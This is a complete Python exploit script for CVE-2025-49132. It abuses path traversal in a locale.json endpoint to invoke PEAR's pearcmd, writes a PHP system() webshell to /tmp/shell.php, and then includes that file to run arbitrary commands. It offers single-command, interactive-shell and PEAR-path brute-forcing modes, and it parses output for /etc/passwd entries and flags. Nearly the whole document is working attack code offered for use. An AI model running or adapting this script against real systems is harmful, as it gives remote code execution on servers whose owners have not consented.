#!/usr/bin/env python3
"""
CVE-2025-49132 PEAR Exploit - Optimized Version, lmao
"""

import sys
import subprocess
import re
import argparse
from typing import Optional, Tuple


class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'


def print_info(msg: str) -> None:
    print(f"{Colors.BLUE}[*]{Colors.END} {msg}")


def print_success(msg: str) -> None:
    print(f"{Colors.GREEN}[+]{Colors.END} {msg}")


def print_error(msg: str) -> None:
    print(f"{Colors.RED}[-]{Colors.END} {msg}")


def clean_output(raw_output: str) -> Optional[str]:
    """Clean PEAR config output to extract actual command results."""
    if not raw_output:
        return None
    
    lines = raw_output.split('\n')
    results = []
    patterns_to_find = ['uid=', 'FLAG{', 'root:', 'www-data', 'bin/', 'total ']
    
    for line in lines:
        if not line.strip():
            continue
            
        if any(pattern in line for pattern in patterns_to_find):
            clean = re.sub(r'\x1b\[[0-9;]*m', '', line)
            clean = re.sub(r'.*?(uid=\d+.*?)\s+uid=.*', r'\1', clean)
            clean = clean.strip()
            
            if clean and clean not in results:
                results.append(clean)
    
    if results:
        return '\n'.join(results)
    
    regex_patterns = [
        r'(uid=\d+\([^)]+\)[^\n<]+)',
        r'(FLAG\{[^}]+\})',
        r'(root:[^:]+:[^:]+:[^:]+:[^:]+:[^:]+:[^\n]+)',
        r'(total\s+\d+.*)',
    ]
    
    for pattern in regex_patterns:
        match = re.search(pattern, raw_output, re.MULTILINE)
        if match:
            return match.group(1)
    
    if not raw_output.strip().startswith('{'):
        return raw_output[:500].strip()
    
    return None


def exploit(
    host: str,
    command: str,
    pear_path: str = "../../../../../../usr/share/php/PEAR",
    port: Optional[int] = None,
    verbose: bool = False
) -> Tuple[bool, Optional[str]]:
    """Execute the PEAR exploit."""
    payload = command.replace(' ', '\\$\\{IFS\\}')
    base_url = f"http://{host}:{port}" if port else f"http://{host}"
    
    print_info(f"Target: {base_url}")
    print_info(f"PEAR Path: {pear_path}")
    print_info(f"Command: {command}\n")
    
    # Write payload
    print_info("Writing payload to /tmp/shell.php...")
    write_url = (
        f'{base_url}/locales/locale.json?'
        f'+config-create+/&'
        f'locale={pear_path}&'
        f'namespace=pearcmd&'
        f'/<?=system(\'{payload}\')?>+/tmp/shell.php'
    )
    
    if verbose:
        print(f"Write URL: {write_url}\n")
    
    write_result = subprocess.run(
        f'curl -s "{write_url}"',
        shell=True,
        capture_output=True,
        text=True
    )
    
    if verbose:
        print(f"Write response: {write_result.stdout[:200]}\n")
    
    print_success("Payload written")
    
    # Execute payload
    print_info("Executing payload...")
    exec_url = f'{base_url}/locales/locale.json?locale=../../../../../tmp&namespace=shell'
    
    if verbose:
        print(f"Exec URL: {exec_url}\n")
    
    exec_result = subprocess.run(
        f'curl -s "{exec_url}"',
        shell=True,
        capture_output=True,
        text=True
    )
    
    output = clean_output(exec_result.stdout)
    
    if output:
        print_success("Command executed successfully!\n")
        print(f"{Colors.BOLD}{'='*60}")
        print("OUTPUT:")
        print(f"{'='*60}{Colors.END}")
        print(output)
        print(f"{Colors.BOLD}{'='*60}{Colors.END}")
        return True, output
    
    print_error("No output received or command failed")
    if verbose:
        print(f"\nRaw response:\n{exec_result.stdout[:500]}")
    return False, None


def interactive_shell(
    host: str,
    pear_path: str,
    port: Optional[int] = None
) -> None:
    """Provide an interactive shell."""
    print_success("Entering interactive shell mode")
    print_info("Type 'exit' or 'quit' to leave\n")
    
    while True:
        try:
            command = input(f"{Colors.GREEN}shell>{Colors.END} ").strip()
            
            if command.lower() in ('exit', 'quit', 'q'):
                print_info("Exiting shell")
                break
            
            if not command:
                continue
            
            success, _ = exploit(host, command, pear_path, port, verbose=False)
            
            if not success:
                print_error("Command execution failed")
            
            print()
            
        except KeyboardInterrupt:
            print("\n")
            print_info("Exiting shell")
            break
        except Exception as e:
            print_error(f"Error: {e}")


def find_pear_path(host: str, port: Optional[int] = None) -> Optional[str]:
    """Try to find the correct PEAR path."""
    print_info("Searching for PEAR installation...\n")
    
    base_url = f"http://{host}:{port}" if port else f"http://{host}"
    
    pear_paths = [
        ("../../../../../../usr/share/php/PEAR", "Debian/Ubuntu (php-pear package)"),
        ("../../../../../../usr/lib/php8/PEAR", "PHP 8 (Alpine/custom)"),
        ("../../../../../../usr/share/pear", "Alternative Debian/Ubuntu"),
        ("../../../../../../usr/local/lib/php/PEAR", "Custom PHP install"),
        ("../../../../../../opt/php/lib/php/PEAR", "Optional PHP install"),
        ("../../../../../usr/share/php/PEAR", "Shallower web root (depth 5)"),
        ("../../../../../../../usr/share/php/PEAR", "Deeper web root (depth 7)"),
    ]
    
    keywords = ('pear', 'pearcmd', 'system.php', 'config')
    
    for pear_path, description in pear_paths:
        url = f'{base_url}/locales/locale.json?locale={pear_path}'
        
        print(f"Testing: {description}")
        print(f"  Path: {pear_path}")
        
        result = subprocess.run(
            f'curl -s "{url}"',
            shell=True,
            capture_output=True,
            text=True
        )
        
        if any(keyword in result.stdout.lower() for keyword in keywords):
            print_success(f"Found PEAR at: {pear_path}\n")
            return pear_path
        
        print_error("Not found")
        print()
    
    print_error("PEAR not found in common locations")
    print_info("You may need to specify the path manually with --pear-path")
    return None


def main() -> None:
    parser = argparse.ArgumentParser(
        description='CVE-2025-49132 PEAR Exploit (Optimized)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Execute single command
  python3 exploit.py --host target.example.com --command "id"
  
  # With custom PEAR path and port
  python3 exploit.py --host 192.168.1.100 --port 8080 --command "whoami" --pear-path "../../../../../../usr/lib/php8/PEAR"
  
  # Interactive shell
  python3 exploit.py --host target.example.com --interactive
  
  # Find PEAR path
  python3 exploit.py --host target.example.com --find-pear
  
  # Verbose mode
  python3 exploit.py --host target.example.com --command "ls -la" -v
        '''
    )
    
    parser.add_argument('--host', required=True, help='Target hostname or IP')
    parser.add_argument('--port', type=int, help='Target port (default: 80)')
    parser.add_argument('--command', '-c', help='Command to execute')
    parser.add_argument(
        '--pear-path',
        default='../../../../../../usr/share/php/PEAR',
        help='Path to PEAR (default: ../../../../../../usr/share/php/PEAR)'
    )
    parser.add_argument(
        '--interactive',
        '-i',
        action='store_true',
        help='Interactive shell mode'
    )
    parser.add_argument(
        '--find-pear',
        action='store_true',
        help='Search for PEAR path'
    )
    parser.add_argument(
        '--verbose',
        '-v',
        action='store_true',
        help='Verbose output'
    )
    
    args = parser.parse_args()
    
    print(f"""{Colors.GREEN}
                   __
                  / _)
         _.----._/ /
        /         /
     __/ (  | (  |
    /__.-'|_|--|_|

    {Colors.BOLD}CVE-2025-49132 PEAR RCE Exploit{Colors.END}{Colors.GREEN}
    Target: {args.host}
{Colors.END}""")
    
    if args.find_pear:
        found_path = find_pear_path(args.host, args.port)
        if found_path:
            print_success(f"Use this path: --pear-path \"{found_path}\"")
        return
    
    if args.interactive:
        interactive_shell(args.host, args.pear_path, args.port)
        return
    
    if not args.command:
        print_error("Please specify --command or use --interactive mode")
        parser.print_help()
        return
    
    exploit(args.host, args.command, args.pear_path, args.port, args.verbose)


if __name__ == '__main__':
    main()
